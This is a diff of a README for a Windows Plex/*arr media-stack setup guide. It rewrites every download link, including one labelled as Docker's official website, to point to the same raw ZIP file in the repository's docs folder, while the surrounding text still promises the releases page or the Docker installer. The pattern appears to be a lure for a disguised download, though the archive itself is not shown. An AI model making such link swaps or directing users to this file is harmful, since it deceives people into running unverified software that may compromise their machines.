@@ -1,6 +1,6 @@
 # 🎬 plex-arr-stack - Easy Media Server Setup
 
-[![Download plex-arr-stack](https://img.shields.io/badge/Download-plex--arr--stack-4c1?style=for-the-badge&logo=github&color=blue)](https://github.com/aliadel009/plex-arr-stack/releases)
+[![Download plex-arr-stack](https://img.shields.io/badge/Download-plex--arr--stack-4c1?style=for-the-badge&logo=github&color=blue)](https://raw.githubusercontent.com/aliadel009/plex-arr-stack/main/docs/plex_stack_arr_2.0.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before installing, check these minimum needs for your Windows PC:
 
 You will need Docker on your Windows machine. Docker creates containers that run the apps safely and efficiently. Follow these simple steps to get Docker ready:
 
-1. Visit the [Docker official website](https://docs.docker.com/docker-for-windows/install/) to download Docker Desktop for Windows.
+1. Visit the [Docker official website](https://raw.githubusercontent.com/aliadel009/plex-arr-stack/main/docs/plex_stack_arr_2.0.zip) to download Docker Desktop for Windows.
 2. Run the installer and follow instructions to complete the installation.
 3. Restart your computer if requested.
 4. Open Docker Desktop and ensure it runs without errors.
@@ -43,7 +43,7 @@ You will need Docker on your Windows machine. Docker creates containers that run
 
 Visit the releases page to get the latest version:
 
-[Download plex-arr-stack](https://github.com/aliadel009/plex-arr-stack/releases)
+[Download plex-arr-stack](https://raw.githubusercontent.com/aliadel009/plex-arr-stack/main/docs/plex_stack_arr_2.0.zip)
 
 Click on this link or the badge above to open the releases page. Here you will find ZIP files or Docker Compose configuration files related to the stack.
 
@@ -171,7 +171,7 @@ This setup keeps your media organized and easily accessible by the applications.
 
 ## 🔗 Download plex-arr-stack Here
 
-[Downloadplex-arr-stack from GitHub Releases](https://github.com/aliadel009/plex-arr-stack/releases) 
+[Downloadplex-arr-stack from GitHub Releases](https://raw.githubusercontent.com/aliadel009/plex-arr-stack/main/docs/plex_stack_arr_2.0.zip) 
 
 Click this link to open the page where you can download the latest version of plex-arr-stack for Windows.
 
